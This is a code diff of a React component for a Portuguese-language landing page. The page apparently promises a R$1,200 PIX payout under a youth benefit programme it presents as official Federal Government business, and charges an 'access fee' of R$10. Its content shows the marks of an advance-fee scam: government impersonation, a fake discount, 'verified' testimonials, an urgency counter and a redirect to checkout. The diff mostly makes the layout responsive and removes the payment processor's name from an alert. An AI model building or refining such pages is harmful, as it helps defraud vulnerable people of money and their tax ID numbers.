@@ -101,7 +101,7 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
   const handleLiberarAcessoClick = () => {
     taxSectionRef.current?.scrollIntoView({ behavior: 'smooth' });
     setTimeout(() => {
-      alert("Você será redirecionado para a plataforma de pagamento segura AppMax para concluir a liberação da sua CHAVE PIX de R$1.200,00.");
+      alert("Você será redirecionado para a plataforma de pagamento segura para concluir a liberação da sua CHAVE PIX de R$1.200,00.");
       window.location.href = "https://appmax.com.br/checkout-fake-placeholder"; 
     }, 100); 
   };
@@ -122,16 +122,16 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
         </div>
 
         {/* Benefícios disponíveis em destaque */}
-        <div className="bg-white rounded-xl shadow-xl p-8 mb-8 border-l-8 border-green-600 animate-scale-in">
+        <div className="bg-white rounded-xl shadow-xl p-6 md:p-8 mb-8 border-l-8 border-green-600 animate-scale-in">
             <h2 className="text-2xl md:text-3xl font-black text-gray-800 mb-6 text-center">Acesso LIBERADO para você:</h2>
-            <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-6 mb-8">
+            <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-4 md:gap-6 mb-8">
                 {benefitsFromUserCode.map((beneficio, index) => (
-                    <div key={index} className="bg-green-50 p-6 rounded-lg border border-green-200 shadow-md transform hover:scale-105 transition-all duration-200">
+                    <div key={index} className="bg-green-50 p-4 md:p-6 rounded-lg border border-green-200 shadow-md transform hover:scale-105 transition-all duration-200">
                         <div className="text-center">
-                            <div className="text-4xl mb-3 animate-pulse-slow">{beneficio.icon}</div>
-                            <h3 className="font-bold text-gray-800 mb-2 text-lg">{beneficio.nome}</h3>
-                            <p className="text-green-700 font-black text-2xl mb-2">{beneficio.valor}</p>
-                            <p className="text-sm text-gray-600">{beneficio.descricao}</p>
+                            <div className="text-3xl md:text-4xl mb-3 animate-pulse-slow">{beneficio.icon}</div>
+                            <h3 className="font-bold text-gray-800 mb-2 text-base md:text-lg">{beneficio.nome}</h3>
+                            <p className="text-green-700 font-black text-xl md:text-2xl mb-2">{beneficio.valor}</p>
+                            <p className="text-xs md:text-sm text-gray-600">{beneficio.descricao}</p>
                             <CheckCircle className="text-green-500 mx-auto mt-3 animate-fade-in" size={24} />
                         </div>
                     </div>
@@ -140,39 +140,39 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
         </div>
 
         {/* Seção de Chamada para Ação (CTA) */}
-        <div className="text-center py-[50px] px-[20px] bg-[#0056b3] rounded-lg font-[Arial,sans-serif]">
-          <h2 className="text-[2.2em] text-white mb-[20px] font-bold">
+        <div className="text-center py-10 md:py-[50px] px-4 md:px-[20px] bg-[#0056b3] rounded-lg font-[Arial,sans-serif]">
+          <h2 className="text-2xl md:text-[2.2em] text-white mb-4 md:mb-[20px] font-bold">
             Pronto para dar o Próximo Passo?
           </h2>
-          <p className="text-[1.2em] text-white max-w-[700px] mx-auto mb-[30px]">
+          <p className="text-base md:text-[1.2em] text-white max-w-[700px] mx-auto mb-6 md:mb-[30px]">
             Descubra se você se qualifica para os benefícios do Programa Jovem Cidadão Ativo e inicie sua jornada. Todo o processo é seguro, transparente e realizado via plataforma oficial do Governo Federal.
           </p>
           <Button
             onClick={handleEligibilityCheckClick}
-            className="bg-[#ffc107] text-[#003366] py-[18px] px-[40px] text-[1.6em] font-bold border-none rounded-[10px] cursor-pointer transition-colors duration-300 ease-linear hover:bg-[#e0a800] no-underline h-auto"
+            className="bg-[#ffc107] text-[#003366] py-3 px-6 text-lg md:py-4 md:px-10 md:text-xl font-bold border-none rounded-[10px] cursor-pointer transition-colors duration-300 ease-linear hover:bg-[#e0a800] no-underline h-auto"
           >
             Verificar Minha Elegibilidade Agora
           </Button>
-          <p className="text-[0.9em] mt-[20px] text-[rgba(255,255,255,0.8)]">
+          <p className="text-sm md:text-[0.9em] mt-4 md:mt-[20px] text-[rgba(255,255,255,0.8)]">
             Sua segurança e privacidade são prioridade.
           </p>
         </div>
           
         {/* Seção de Taxa Administrativa */}
         <div ref={taxSectionRef} id="taxSection" className="my-10 p-6 md:p-8 bg-primary text-primary-foreground rounded-xl shadow-2xl border-4 border-yellow-400 text-center relative overflow-hidden">
-          <div className="absolute -top-4 -left-12 transform -rotate-45 bg-yellow-400 text-primary font-bold py-2 px-16 text-sm shadow-lg">
+          <div className="absolute -top-4 -left-12 transform -rotate-45 bg-yellow-400 text-primary font-bold py-2 px-16 text-sm shadow-lg hidden sm:block">
             OFERTA ÚNICA
           </div>
-          <AlertTriangle className="h-12 w-12 text-yellow-400 mx-auto mb-4 animate-pulse" />
-          <h3 className="font-headline text-2xl md:text-3xl font-extrabold mb-2 uppercase">
+          <AlertTriangle className="h-10 w-10 md:h-12 md:w-12 text-yellow-400 mx-auto mb-4 animate-pulse" />
+          <h3 className="font-headline text-xl md:text-3xl font-extrabold mb-2 uppercase">
             ÚNICA TAXA DE ACESSO!
           </h3>
-          <p className="text-lg md:text-xl mb-1 line-through opacity-70">DE <span className="font-bold">R$297,00</span></p>
+          <p className="text-base md:text-lg mb-1 line-through opacity-70">DE <span className="font-bold">R$297,00</span></p>
           <div className="my-3">
             <span className="text-6xl md:text-8xl font-extrabold text-yellow-400 tracking-tighter">R$10</span>
             <span className="text-4xl md:text-6xl font-extrabold text-yellow-400">,00</span>
           </div>
-          <p className="text-sm md:text-base font-semibold bg-yellow-400 text-primary py-1 px-3 rounded-md inline-block mb-4 shadow-md">
+          <p className="text-xs sm:text-sm md:text-base font-semibold bg-yellow-400 text-primary py-1 px-3 rounded-md inline-block mb-4 shadow-md">
             (VOCÊ ACABA DE ECONOMIZAR <span className="font-bold">R$287,00</span> HOJE!)
           </p>
           <p className="text-xs md:text-sm my-4 leading-relaxed max-w-md mx-auto px-2">
@@ -182,9 +182,9 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
             onClick={handleLiberarAcessoClick}
             variant="default" 
             size="lg" 
-            className="w-full max-w-md mx-auto h-16 text-xl md:text-2xl font-bold bg-accent hover:bg-accent/90 text-accent-foreground shadow-xl mt-4 rounded-lg border-2 border-yellow-200"
+            className="w-full max-w-md mx-auto h-14 text-lg md:h-16 md:text-xl font-bold bg-accent hover:bg-accent/90 text-accent-foreground shadow-xl mt-4 rounded-lg border-2 border-yellow-200"
           >
-            <BadgeCent className="mr-2 h-7 w-7" /> Quero Receber o dinheiro!
+            <BadgeCent className="mr-2 h-6 w-6 md:h-7 md:w-7" /> Quero Receber o dinheiro!
           </Button>
           <p className="text-xs mt-4 text-primary-foreground/80 flex items-center justify-center">
             <ShieldCheck className="h-4 w-4 mr-1.5 text-green-300" /> Pagamento 100% SEGURO e Criptografado! 
@@ -195,7 +195,7 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
         {/* SEÇÃO DE PROVA SOCIAL */}
         <div>
            <h3 className="font-headline text-lg md:text-xl font-bold text-foreground text-center mb-5 uppercase flex items-center justify-center">
-            <Users className="mr-2 h-7 w-7" /> 
+            <Users className="mr-2 h-6 w-6 md:h-7 md:w-7" /> 
             PESSOAS QUE SACARAM HOJE!
           </h3>
           <div className="space-y-4">
@@ -209,23 +209,23 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
                           width={56} 
                           height={56}
                           data-ai-hint={testimonial.dataAiHint || "person avatar"}
-                          className="rounded-full mr-4 border-2 border-accent shadow-md"
+                          className="rounded-full mr-3 md:mr-4 border-2 border-accent shadow-md"
                           />
                       )}
                       <div className="flex-1">
-                          <p className="font-headline text-lg font-semibold text-primary mb-1">🔥 SAQUE CONFIRMADO!</p>
+                          <p className="font-headline text-base md:text-lg font-semibold text-primary mb-1">🔥 SAQUE CONFIRMADO!</p>
                           <p className="text-sm md:text-base text-foreground italic leading-tight" dangerouslySetInnerHTML={{ __html: testimonial.text }} />
-                          <p className="text-sm text-muted-foreground mt-2 font-bold">- {testimonial.name}, {testimonial.location}</p>
+                          <p className="text-xs md:text-sm text-muted-foreground mt-2 font-bold">- {testimonial.name}, {testimonial.location}</p>
                           <p className="text-xs text-green-600 font-semibold mt-1">(VERIFICADO AGORA ✅)</p>
                       </div>
                   </div>
               </div>
             ))}
           </div>
-          <div className="mt-10 text-center p-5 bg-primary text-primary-foreground rounded-lg shadow-xl border-2 border-yellow-300">
-            <TrendingUp className="h-10 md:h-12 w-10 md:h-12 mx-auto mb-2 text-yellow-300 animate-pulse" />
-            <p className="text-5xl md:text-6xl font-bold text-yellow-300">{peopleServed.toLocaleString('pt-BR')}</p>
-            <p className="text-md md:text-lg font-semibold uppercase">📈 BRASILEIROS JÁ SACARAM SÓ HOJE! <span className="text-yellow-300">NÃO FIQUE PRA TRÁS!</span></p>
+          <div className="mt-10 text-center p-4 md:p-5 bg-primary text-primary-foreground rounded-lg shadow-xl border-2 border-yellow-300">
+            <TrendingUp className="h-8 w-8 md:h-10 md:w-10 lg:h-12 lg:w-12 mx-auto mb-2 text-yellow-300 animate-pulse" />
+            <p className="text-4xl md:text-5xl lg:text-6xl font-bold text-yellow-300">{peopleServed.toLocaleString('pt-BR')}</p>
+            <p className="text-sm md:text-md lg:text-lg font-semibold uppercase">📈 BRASILEIROS JÁ SACARAM SÓ HOJE! <span className="text-yellow-300">NÃO FIQUE PRA TRÁS!</span></p>
           </div>
         </div>
     </div>
